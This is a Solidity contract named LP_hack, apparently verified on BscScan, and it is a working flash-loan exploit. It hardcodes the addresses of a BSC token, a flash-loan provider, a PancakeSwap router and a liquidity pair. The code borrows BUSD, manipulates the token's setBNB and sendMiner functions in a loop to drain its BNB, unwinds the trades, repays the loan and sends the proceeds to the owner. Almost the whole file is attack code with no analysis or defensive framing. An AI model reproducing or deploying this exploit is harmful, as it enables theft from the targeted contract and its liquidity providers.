/**
 *Submitted for verification at BscScan.com on 2023-03-02
*/

interface IERC20 {
    function transfer(address dst, uint wad) external returns (bool);
    function approve(address guy, uint wad) external returns (bool);
    function balanceOf(address account) external view returns (uint);
}

interface IFlashBorrower {

    function onFlashLoan(
        address initiator,
        address tokenToBorrow,
        address tokenToRepay,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}



interface IMBEproToken {
    function setBNB()payable external;
    function sendMiner() external;
    function getagk() external  view returns (uint);
    function Yesterday() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function approve(address guy, uint wad) external returns (bool);
    function transfer(address dst, uint wad) external returns (bool);
}
interface IFlashLoanProvider {
    function flashLoan(
        IFlashBorrower receiver,
        address tokenToBorrow,
        address tokenToRepay,
        uint256 amount,
        bytes calldata data_
    ) external returns (bool);
}


contract LP_hack is IFlashBorrower{

    address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public owner;
    IRouter router;
    address public pair;
    IMBEproToken public target;
    IFlashLoanProvider loan;
    bytes32 public constant CALLBACK_SUCCESS = keccak256('ERC3156FlashBorrower.onFlashLoan');

    modifier onlyOwner {
        require(owner == msg.sender, "not owner");
        _;
    }



    constructor() {
        target = IMBEproToken(0xe38178B323c489F4A9a6ffa88ec04c309ef950b8);
        loan = IFlashLoanProvider(0x7FEeb737D07F24eAa76F146295f0f3D4ad9c2Adc);
        router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = 0xe52B96795d68C531ABBd2Da480e08F532b474183;
        owner = msg.sender;
        
    }  

    receive() external payable{}

    function attack(uint amount) public onlyOwner {
        bytes memory data;
        loan.flashLoan(IFlashBorrower(address(this)), busd, busd, amount, data);
    }


    function onFlashLoan2(
        address initiator,
        address token1,
        address token2,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external  returns (bytes32) {
        IERC20(busd).transfer(address(loan), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function onFlashLoan(
        address initiator,
        address token1,
        address token2,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        uint repay = amount+fee;
        address[] memory routePath = new address[](2);
        routePath[0] = busd;
        routePath[1] = wbnb;
        IERC20(busd).approve(address(router), IERC20(busd).balanceOf(address(this)));
        router.swapExactTokensForETH(IERC20(busd).balanceOf(address(this)), 0, routePath, address(this), block.timestamp);
        uint balance = address(this).balance;
        require(balance > 200 ether, "er1");

        uint value_for_pool = 190 ether;
        uint value_for_lp = balance - value_for_pool;
        address[] memory routePath2 = new address[](2);
        routePath2[0] = wbnb;
        routePath2[1] = address(target);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: value_for_lp/2}(0, routePath2, address(this), block.timestamp );
        target.setBNB{value: value_for_pool}();

        
        uint target_balance = target.balanceOf(address(this));
        target.approve(address(router), target_balance);
        router.addLiquidityETH{value: value_for_lp/2}(address(target), target_balance, 0, 0, address(this), block.timestamp);
        

        uint lp_balance = IERC20(pair).balanceOf(address(this));
        
        for( uint i; i < 800; i++){
            target.sendMiner();
            if(address(target).balance < 1 ether){
                break;
            }
        }
        IERC20(pair).approve(address(router), lp_balance);       
        router.removeLiquidityETHSupportingFeeOnTransferTokens(address(target), lp_balance, 0, 0, address(this), block.timestamp);
        
       
        address[] memory routePath3 = new address[](2);
        routePath3[1] = wbnb;
        routePath3[0] = address(target);
        target.approve(address(router), target.balanceOf(address(this)));
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(target.balanceOf(address(this)), 0, routePath3, address(this), block.timestamp);
        
        

        address[] memory routePath4 = new address[](2);
        routePath4[0] = wbnb;
        routePath4[1] = busd;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(0, routePath4, address(this), block.timestamp);
        
        IERC20(busd).transfer(address(loan), repay);
        
        return CALLBACK_SUCCESS;

    }


    function withdraw_token(address token) external onlyOwner{
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);

    }

}